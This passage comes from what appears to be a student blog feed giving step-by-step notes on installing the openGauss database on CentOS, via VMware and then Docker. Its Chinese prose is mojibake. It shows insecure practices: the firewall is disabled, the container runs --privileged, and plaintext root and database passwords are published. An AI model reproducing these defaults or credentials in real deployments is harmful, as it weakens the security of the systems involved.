class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;gaussdbLogPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/var/log/omm&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;tmpMppdbPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/opt/huawei/tmp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;gaussdbToolPath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/opt/huawei/install/om&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;corePath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/opt/huawei/corefile&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;clusterType&quot;</span> <span class="attr">value</span>=<span class="string">&quot;single-inst&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">CLUSTER</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- æ¯å°æœåŠ¡å™¨ä¸Šçš„èŠ‚ç‚¹éƒ¨ç½²ä¿¡æ¯ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DEVICELIST</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- node1ä¸Šçš„èŠ‚ç‚¹éƒ¨ç½²ä¿¡æ¯ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DEVICE</span> <span class="attr">sn</span>=<span class="string">&quot;1000001&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Aimerl0&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;azName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;AZ1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;azPriority&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å¦‚æœæœåŠ¡å™¨åªæœ‰ä¸€ä¸ªç½‘å¡å¯ç”¨ï¼Œå°† backIP1å’Œ sshIP1é…ç½®æˆåŒä¸€ä¸ª IP --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;backIp1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;sshIp1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;192.168.1.142&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--dbnode--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;dataNum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;dataPortBase&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26000&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;dataNode1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/opt/huawei/install/data/db1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DEVICE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DEVICELIST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ROOT</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¬¬é›¶æ­¥ï¼šå¼€ xshell è¿æˆ‘ä»¬çš„è™šæ‹Ÿæœºï¼Œå› ä¸ºå¯ä»¥ç›´æ¥å¤åˆ¶å‘½ä»¤è¿›å»ï¼Œå®‰è£… xshell è½¯ä»¶ï¼Œæ‰“å¼€ï¼Œå·¦ä¸Šè§’æ–‡ä»¶ç„¶åæ–°å»º</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010910.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410010919.png"></p><p>ç‚¹å‡»è¿æ¥å³å¯ï¼Œä¹‹åçš„å‘½ä»¤éƒ½åœ¨ xshell çš„ç»ˆç«¯é‡Œè¾“å…¥ï¼Œå¯ä»¥ä»æ–‡æ¡£ä¸­å¤åˆ¶ç„¶åè¿›å»å³é”®ç²˜è´´</p><p>ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºå­˜æ”¾æ•°æ®åº“å®‰è£…ç›®å½•ï¼Œå‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /opt/software/openGauss</span><br></pre></td></tr></table></figure><p>ä¸‹è½½æ•°æ®åº“å®‰è£…åŒ…:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://opengauss.obs.cn-south-1.myhuaweicloud.com/1.1.0/x86/openGauss-1.1.0-CentOS-64bit-all.tar.gz</span><br></pre></td></tr></table></figure><p>è§£å‹ openGauss-1.1.0-CentOS-64bit-all.tar.gz åŒ…: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf openGauss-1.1.0-CentOS-64bit-all.tar.gz</span><br></pre></td></tr></table></figure><p>å†è§£å‹ openGauss-1.1.0-CentOS-64bit-om.tar.gz åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf openGauss-1.1.0-CentOS-64bit-om.tar.gz</span><br></pre></td></tr></table></figure><p>è§£å‹å®Œæˆåè¾“å…¥ ls çœ‹åˆ°å¦‚ä¸‹</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011222.png"></p><p>æ›´æ”¹æƒé™ï¼š <code>chmod 755 -R /opt/software</code></p><p>åšå¿«ç…§ï¼Œxshell è·Ÿè™šæ‹Ÿæœºæ˜¯åŒæ­¥çš„ï¼Œæ‰€ä»¥æ­¤æ—¶è™šæ‹Ÿæœºå·²ç»æ‰§è¡Œäº†ä¸Šé¢çš„å‘½ä»¤ï¼Œæ‰€ä»¥å¯ä»¥å»ºç«‹å¿«ç…§ï¼Œå‘½åéšä¾¿ï¼Œå‡†å¤‡å®‰è£…</p><p>åˆ›å»ºç”¨æˆ·å’Œç»„</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011254.png"></p><p>è¾“å…¥å¯†ç ä¸º <code>openGauss</code></p><p>ä¸‹é¢ç»™ omm ç”¨æˆ·æˆæƒ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011315.png"></p><p>å¼€å§‹å®‰è£…</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011329.png"></p><p>å®‰è£…æˆåŠŸæ— æŠ¥é”™</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011339.png"></p><p>åšå¿«ç…§</p><p>é…ç½®å…å¯†é’¥ç™»å½•å’Œæ“ä½œç³»ç»Ÿå‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/.ssh</span><br><span class="line">ssh-keygen -t rsa -f ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p>è¿æŒ‰ä¸¤ä¸‹ç©ºæ ¼ç”Ÿæˆç»“æœå¦‚ä¸‹</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011411.png"></p><p>ä¸‹é¢å°†è¿™äº›å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢å¹¶ä¸”æµ‹è¯•ä¸éœ€è¦å¯†ç ç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line">ssh 192.168.1.142ï¼ˆipåœ°å€ï¼‰</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011436.png"></p><p>ä¸‹é¢ï¼Œé…ç½®<code>/etc/hosts</code>æ–‡ä»¶ï¼Œ<code>vi /etc/hosts</code> è¿›å»ä»¥ååŠ ä¸€è¡Œ(vi çš„æ“ä½œéƒ½ä¸€æ ·)ï¼Œå†…å®¹ä¸º <code>â€œipåœ°å€ï¼ˆä¸‰ä¸ªç©ºæ ¼ï¼‰Aimerl0(ä¹‹å‰é…ç½®çš„hostname)</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011502.png"></p><p>ä¹‹åä¿®æ”¹ä¼ è¾“æ–‡ä»¶çš„æœ€å¤§å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;* soft nofile 1000000&quot; &gt;&gt; /etc/security/limits.conf</span><br><span class="line">echo &quot;* hard nofile 1000000&quot; &gt;&gt; /etc/security/limits.conf</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011527.png"></p><p>åšä¸ªå¿«ç…§ï¼Œä¹‹åå¼€å§‹æ­£å¼å®‰è£…ï¼Œåšå®Œå¿«ç…§ reboot é‡å¯ä¸€é</p><p>è¾“å…¥ <code>su - omm</code>ï¼Œå†è¾“å…¥<code>gs_install -X /opt/software/openGauss/clusterconfig.xml</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011620.png"></p><p>ä¹‹åè¦è®¾ç½®ä¸€ä¸ªæ•°æ®åº“çš„å¯†ç ï¼Œ<code>Aimerl0@123</code></p><p>å®‰è£…è¿‡ç¨‹æœ‰ç‚¹ä¹…ï¼Œè€Œä¸”æœŸé—´è¦å¤šæ¬¡è¾“å…¥omm ç”¨æˆ·çš„å¯†ç ï¼Œè¾“å…¥ä¹‹å‰è®¾ç½®çš„ <code>openGauss</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011655.png"></p><blockquote><p>å¦‚æœæœ‰æŠ¥é”™ï¼Œè·Ÿä¸‹å›¾ä¸ä¸€æ ·ï¼Œæ¢å¤å¿«ç…§ï¼Œreboot é‡å¯ï¼Œå¯èƒ½æ˜¯è™šæ‹Ÿæœºå†…å­˜ä¸å¤Ÿï¼Œç„¶åå†å®‰è£…ä¸€éï¼Œå¦‚æœè¿˜ä¸è¡Œï¼Œå¯èƒ½æ˜¯ç‰©ç†æœºä¸Šçš„ç”µè„‘å†…å­˜ä¸å¤ªå¤Ÿç”¨ï¼Œä¸å¤ªå¤Ÿåˆ†é…ç»™è™šæ‹Ÿæœºäº†ï¼Œé‡å¯ç”µè„‘</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011748.png"></p><p>å®‰è£…æˆåŠŸåå»ºç«‹å¿«ç…§</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011803.png"></p><p>ç»ˆäºæˆåŠŸäº†ï¼Œè¿™é‡Œè¾“å…¥çš„æ•°æ®åº“å¯†ç æ˜¯ <code>Aimerl0@123</code> ï¼Œomm çš„å¯†ç æ˜¯ <code>openGauss</code>ï¼Œå¼€æœº root è´¦æˆ·å¯†ç æ˜¯ <code>010625.</code></p><h1 id="openGauss-çš„ç®€å•å®ç”¨"><a href="#openGauss-çš„ç®€å•å®ç”¨" class="headerlink" title="openGauss çš„ç®€å•å®ç”¨"></a>openGauss çš„ç®€å•å®ç”¨</h1><p>è¿™é‡Œå‡è®¾ï¼ŒopenGauss å·²ç»å¯åŠ¨ï¼ˆé»˜è®¤å®‰è£…åï¼Œä¼šå¯åŠ¨ï¼Œå…³æœºåçš„å¯åŠ¨è§åé¢ï¼‰ï¼Œä¸‹é¢æµ‹è¯•è¿æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su root è¾“å…¥å¯†ç </span><br><span class="line">cd /opt/software/openGauss/script/</span><br><span class="line">./gs_checkos -i A</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410011917.png"></p><p>ä¹‹åè¿›å…¥ openGauss</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - omm</span><br><span class="line">gs_om -t status -detail</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410012007.png"></p><p>æŸ¥çœ‹ç«¯å£ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/huawei/install/data/db1/postgresql.conf | grep port</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410012035.png"></p><p>å¯ä»¥çœ‹åˆ°26000æ˜¯ä¸»ç»“ç‚¹ç«¯å£å·ï¼Œä½¿ç”¨ <code>gsql</code> è¿æ¥æ•°æ®åº“ï¼Œè¿æ¥æˆåŠŸ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410012058.png"></p><p>æ¥ä¸‹æ¥æ˜¯æ•°æ®åº“çš„ä½¿ç”¨ï¼Œåä¸ºå¼€æºçš„ openGauss æ•°æ®åº“çš„å†…æ ¸é‡‡ç”¨çš„æ˜¯ postgreSQL ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„æ•°æ®åº“æ“ä½œã€è¯­æ³•éƒ½éµå¾ªå…¶è¯­æ³•ï¼Œèœé¸Ÿæ•™ç¨‹é‡Œé¢æœ‰æ•™æ€ä¹ˆç”¨ï¼Œéšä¾¿å­¦å­¦å°±ä¼šäº†</p><h1 id="å…³æœºåå†å¼€æœºï¼Œå¦‚ä½•è¿è¡Œ-openGauss"><a href="#å…³æœºåå†å¼€æœºï¼Œå¦‚ä½•è¿è¡Œ-openGauss" class="headerlink" title="å…³æœºåå†å¼€æœºï¼Œå¦‚ä½•è¿è¡Œ openGauss"></a>å…³æœºåå†å¼€æœºï¼Œå¦‚ä½•è¿è¡Œ openGauss</h1><p>ä¹Ÿæ˜¯å…ˆ<code> su â€“ omm</code>åˆ‡æ¢ç”¨æˆ·ï¼Œç„¶å<code>gs_om -t start</code>å³å¯å¯åŠ¨</p><p>è¿æ¥æ•°æ®åº“ <code>postgres</code> çš„æ“ä½œå°±æ˜¯ <code>gsql -d postgres -p 26000</code></p><p>å…¶ä¸­ <code>postgres</code> æ˜¯æ•°æ®åº“åï¼ŒopenGauss é»˜è®¤çš„æ•°æ®åº“æ˜¯ <code>postgres</code></p><p>å¦‚æœæœ‰è‡ªå·±åŸå…ˆåˆ›å»ºçš„æ•°æ®åº“ï¼Œæ”¹ä¸ªåè¿æ¥å°±è¡Œ</p><blockquote><p>å‚è€ƒèµ„æ–™</p><p>å­¦æ ¡è€å¸ˆå‘çš„å®˜æ–¹æ–‡æ¡£ï¼ˆåœ¨æœ¬åœ°ï¼‰</p><p>æœ¬ç¯‡åšå®¢å‚è€ƒèµ„æ–™æ¥è‡ªå…¶ä»–è¯¾å·å”è€å¸ˆçš„å®‰è£…æŒ‡å¯¼æ–‡æ¡£ï¼š<a href="https://data.educoder.net/api/attachments/1562695">åœ°å€</a></p><p><a href="https://blog.csdn.net/qq_41619524/article/details/109722264">CentOS 7 ä¸‹å®‰è£…openGaussè¯¦ç»†æ•™ç¨‹ï¼ˆå•æœºæˆ–ä¸€ä¸»å¤šä»ï¼‰ä»¥åŠéƒ¨ç½²ä¸€äº›é—®é¢˜_å››å²å°çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/whereiwillgo/article/details/107317991">openGaussæ•°æ®åº“å®‰è£…æ‰‹å†Œ_whereiwillgoçš„åšå®¢-CSDNåšå®¢_opengausså®‰è£…æŒ‡å—</a></p><p><a href="https://www.modb.pro/db/27477">æ‰‹æŠŠæ‰‹å¸¦ä½ å¿«é€Ÿå®‰è£…openGauss - å¢¨å¤©è½®</a></p><p><a href="https://blog.csdn.net/ygp12345/article/details/107972011">openGaussä¿å§†å¼å®‰è£…è¯´æ˜_ygp12345çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="http://www.cuug.com/index.php?s=/home/article/detail/id/2029.html">å®‰è£…openGaussï¼šæ‰§è¡Œå®‰è£…åŠç¤ºä¾‹</a></p><p><a href="https://www.bilibili.com/video/av670496611/">è½»æ¾ä¸Šæ‰‹openGaussï¼ˆç¨‹åºå‘˜ç¯‡ï¼‰ä¹‹openGausså®‰è£…éƒ¨ç½²_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili</a></p><p><a href="https://www.modb.pro/db/33145">openGaussä½¿ç”¨å‡†å¤‡ - å¢¨å¤©è½®</a></p><p><a href="https://www.runoob.com/postgresql/postgresql-syntax.html">PostgreSQL è¯­æ³• | èœé¸Ÿæ•™ç¨‹</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openGauss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openGauss-dockerå®‰è£…</title>
      <link href="/posts/31210/"/>
      <url>/posts/31210/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>ç”¨ VMware æ­ openGauss æœ‰ç‚¹ç‚¹éº»çƒ¦ï¼Œç™¾åº¦åå‘ç°å¯ä»¥ç”¨ docker ç›´æ¥èµ·ï¼Œæ‰€ä»¥å†ç”¨ docker æ­ä¸€é</p></blockquote><h1 id="æ­å»º-CentOS-7-6"><a href="#æ­å»º-CentOS-7-6" class="headerlink" title="æ­å»º CentOS 7.6"></a>æ­å»º CentOS 7.6</h1><p>æ­¥éª¤åŒç”¨ VMware æ­å»ºä¸€æ ·ï¼Œéšä¾¿æ­æ­å°±è¡Œ</p><h1 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h1><p>è¾“å…¥å‘½ä»¤ï¼š<code>wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</code>æ›´æ¢é˜¿é‡Œæº</p><p>è¾“å…¥å‘½ä»¤ï¼š<code>yum clean all</code>æ¸…é™¤ç¼“å­˜</p><p>è¾“å…¥å‘½ä»¤ï¼š<code>yum makecache</code>ç”Ÿæˆç¼“å­˜</p><p>è¾“å…¥å‘½ä»¤ï¼š<code>yum -y update</code>æ›´æ–°yumæº</p><p>æ˜¯ä¸ªæœ‰ç‚¹æ¼«é•¿çš„è¿‡ç¨‹</p><h1 id="å®‰ä¸ª-python3ã€bzip2"><a href="#å®‰ä¸ª-python3ã€bzip2" class="headerlink" title="å®‰ä¸ª python3ã€bzip2"></a>å®‰ä¸ª python3ã€bzip2</h1><p>è¾“å…¥å‘½ä»¤ï¼š<code>yum install python3 bzip2 -y</code></p><h1 id="å…³æ‰é˜²ç«å¢™"><a href="#å…³æ‰é˜²ç«å¢™" class="headerlink" title="å…³æ‰é˜²ç«å¢™"></a>å…³æ‰é˜²ç«å¢™</h1><p>è¾“å…¥å‘½ä»¤ï¼š<code>systemctl stop firewalld.service</code>åœæ­¢é˜²ç«å¢™</p><p>è¾“å…¥å‘½ä»¤ï¼š<code>systemctl disable firewalld.service</code>å…³é—­é˜²ç«å¢™</p><p><code>reboot</code>é‡å¯ä¸€ä¸‹</p><h1 id="å®‰è£…-docker"><a href="#å®‰è£…-docker" class="headerlink" title="å®‰è£… docker"></a>å®‰è£… docker</h1><p>æ£€æŸ¥ Linux ç‰ˆæœ¬ï¼Œå¿…é¡»æ˜¯ 3.10 ä»¥ä¸Šï¼š<code>uname -r</code></p><p>è¾“å…¥å‘½ä»¤ï¼š<code>yum install -y docker</code>å®‰è£… docker</p><p>è¾“å…¥å‘½ä»¤æ£€æŸ¥ docker ï¼š<code>docker -v</code></p><p>è¾“å…¥å‘½ä»¤ï¼š<code>systemctl start docker</code>å¯åŠ¨ docker æœåŠ¡</p><p>è¾“å…¥å‘½ä»¤ï¼š<code>systemctl enable docker</code>å¼€æœºè‡ªå¯åŠ¨ docker</p><p>åœæ­¢ docker å‘½ä»¤ï¼š<code>systemctl stop docker</code></p><h1 id="docker-å¸¸ç”¨å‘½ä»¤"><a href="#docker-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="docker å¸¸ç”¨å‘½ä»¤"></a>docker å¸¸ç”¨å‘½ä»¤</h1><h2 id="é•œåƒæ“ä½œå‘½ä»¤"><a href="#é•œåƒæ“ä½œå‘½ä»¤" class="headerlink" title="é•œåƒæ“ä½œå‘½ä»¤"></a>é•œåƒæ“ä½œå‘½ä»¤</h2><table><thead><tr><th align="center">æ“ä½œ</th><th align="center">å‘½ä»¤</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">æ£€ç´¢</td><td align="center"><code>docker search å…³é”®å­—</code></td><td align="center">docker hub ä¸Šæ£€ç´¢é•œåƒçš„ç›¸å…³ä¿¡æ¯</td></tr><tr><td align="center">æ‹‰å–</td><td align="center"><code>docker pull é•œåƒå:tag</code>ï¼Œtag æ˜¯æ ‡ç­¾ï¼Œä¸€èˆ¬æ˜¯é€‰æ‹©ç‰ˆæœ¬</td><td align="center"><code>:tag</code>å¯é€‰é¡¹ï¼Œé»˜è®¤ä¸º<code>latest</code></td></tr><tr><td align="center">åˆ—è¡¨</td><td align="center"><code>docker images</code></td><td align="center">æŸ¥çœ‹æ‰€æœ‰æœ¬åœ°é•œåƒ</td></tr><tr><td align="center">åˆ é™¤</td><td align="center"><code>docker rmi image-id</code></td><td align="center">åˆ é™¤æŒ‡å®šçš„æœ¬åœ°é•œåƒ</td></tr></tbody></table><blockquote><p>æ‰¾é•œåƒå» <a href="https://hub.docker.com/">https://hub.docker.com/</a> æ‰¾</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410113255.png"></p><h2 id="docker-åŠ é€Ÿ"><a href="#docker-åŠ é€Ÿ" class="headerlink" title="docker åŠ é€Ÿ"></a>docker åŠ é€Ÿ</h2><p>åŠ å¿«æ‹‰å–é€Ÿåº¦å¯ä»¥é…ç½®é•œåƒåŠ é€Ÿçš„æœåŠ¡å™¨ï¼Œé˜¿é‡Œäº‘é•œåƒè·å–åœ°å€ï¼š<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors%EF%BC%8C%E7%99%BB%E9%99%86%E5%90%8E%EF%BC%8C%E5%B7%A6%E4%BE%A7%E8%8F%9C%E5%8D%95%E9%80%89%E4%B8%AD%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%80%E4%B8%AA%E4%B8%93%E5%B1%9E%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%B8%8B%E6%96%87%E5%B0%B1%E6%98%AF%E9%85%8D%E7%BD%AE%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E7%9A%84%E6%96%B9%E6%B3%95">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrorsï¼Œç™»é™†åï¼Œå·¦ä¾§èœå•é€‰ä¸­é•œåƒåŠ é€Ÿå™¨å°±å¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¸“å±åœ°å€ï¼Œä¸‹æ–‡å°±æ˜¯é…ç½®é•œåƒåŠ é€Ÿå™¨çš„æ–¹æ³•</a></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210410113646.png"></p><p>é…ç½®é•œåƒåœ°å€ï¼Œæ‰§è¡Œå‘½ä»¤<code>vi /etc/docker/daemon.json</code>ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¦‚è¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºã€‚åœ¨å…¶ä¸­åŠ å…¥å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;registry-mirrors&quot;:[&quot;https://h9a56rl5.mirror.aliyuncs.com&quot;]&#125;</span><br></pre></td></tr></table></figure><p>ä¾æ¬¡æ‰§è¡Œå‘½ä»¤<code>systemctl daemon-reload</code>å’Œ<code>systemctl restart docker</code>é‡æ–°å¯åŠ¨ docker</p><h1 id="æ‹‰å–-openGauss-é•œåƒå¹¶åˆ›å»º-openGauss-å®¹å™¨"><a href="#æ‹‰å–-openGauss-é•œåƒå¹¶åˆ›å»º-openGauss-å®¹å™¨" class="headerlink" title="æ‹‰å– openGauss é•œåƒå¹¶åˆ›å»º openGauss å®¹å™¨"></a>æ‹‰å– openGauss é•œåƒå¹¶åˆ›å»º openGauss å®¹å™¨</h1><p>é€‰äº‘å’Œæ©å¢¨å…¬å¸çš„é•œåƒå°±è¡Œ</p><p>æ‰§è¡Œ<code>docker run --name opengauss --privileged=true -d -e GS_PASSWORD=Aimerl0@123 -p 6666:5432 enmotech/opengauss:latest</code>æ‹‰å–é•œåƒå¹¶åˆ›å»ºå®¹å™¨</p><h2 id="å‚æ•°è§£é‡Š"><a href="#å‚æ•°è§£é‡Š" class="headerlink" title="å‚æ•°è§£é‡Š"></a>å‚æ•°è§£é‡Š</h2><ul><li><p><code>run --name opengauss</code>ï¼šæŒ‡å®šå®¹å™¨åå­—ä¸º <code>opengauss</code>ï¼Œå¹¶è®© <code>opengauss</code> å®¹å™¨è·‘èµ·æ¥</p></li><li><p><code>--privileged=ture</code>ï¼šå®¹å™¨å†…çš„ root ç”¨æˆ·æ‹¥æœ‰çœŸæ­£çš„ root æƒé™ï¼Œå¦åˆ™å®¹å™¨å†…çš„ root åªæ˜¯å¤–éƒ¨çš„ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™ï¼Œå¼€å¯æ­¤å‚æ•°åï¼Œç”šè‡³å¯ä»¥åœ¨ docker é‡Œé¢èµ· docker</p></li><li><p><code>-d </code>ï¼šåå°è¿è¡Œå®¹å™¨ï¼Œè¿”å›å®¹å™¨çš„ idï¼Œä¹Ÿç§° <strong>å¯åŠ¨å®ˆæŠ¤å¼å®¹å™¨</strong></p></li><li><p><code>-e</code>ï¼šæŒ‡å®šå®¹å™¨å†…çš„ç¯å¢ƒå˜é‡ï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šåé¢çš„å¯†ç </p></li><li><p><code>GS_PASSORD</code>ï¼šä½¿ç”¨ openGauss é•œåƒçš„æ—¶å€™å¿…é¡»è®¾ç½®å‚æ•°ï¼Œä¸èƒ½ä¸ºç©ºæˆ–ä¸å®šä¹‰ï¼Œå› ä¸ºè¯¥å‚æ•°æ˜¯è®¾ç½®æ•°æ®åº“å†…çš„è¶…çº§ç”¨æˆ·<code>omm</code>ä»¥åŠæµ‹è¯•ç”¨æˆ·<code>guassdb</code>çš„å¯†ç ï¼ŒopenGauss å®‰è£…æ—¶é»˜è®¤ä¼šåˆ›å»º <code>omm</code>è¶…çº§ç”¨æˆ·ï¼Œæ­¤ç”¨æˆ·åæ— æ³•æ›´æ”¹ï¼Œæµ‹è¯•ç”¨æˆ·<code>gaussdb</code>çš„èµ· docker æ—¶å€™è‡ªå®šä¹‰åˆ›å»ºçš„ç”¨æˆ·</p><p>æ­¤å¤–ï¼ŒopenGauss é•œåƒé…ç½®äº†æœ¬åœ°ä¿¡ä»»æœºåˆ¶ï¼Œåœ¨å®¹å™¨å†…è¿æ¥æ•°æ®åº“æ— éœ€å¯†ç ï¼Œä»å®¹å™¨å¤–éƒ¨è¿æ¥æ•°æ®åº“éœ€è¦è¾“å…¥å¯†ç </p><p>å†æ­¤å¤–ï¼ŒopenGauss çš„å¯†ç æœ‰å¤æ‚åº¦è¦æ±‚ï¼š<strong>å¯†ç é•¿åº¦8ä¸ªå­—ç¬¦ä»¥ä¸Šï¼Œå¿…é¡»åŒæ—¶åŒ…å«è‹±æ–‡å­—æ¯ï¼Œæ•°å­—ï¼Œä»¥åŠç‰¹æ®Šç¬¦å·</strong></p></li><li><p><code>-p</code>ï¼šæŒ‡å®šä¸€ä¸ªç«¯å£æ˜ å°„ï¼Œå› 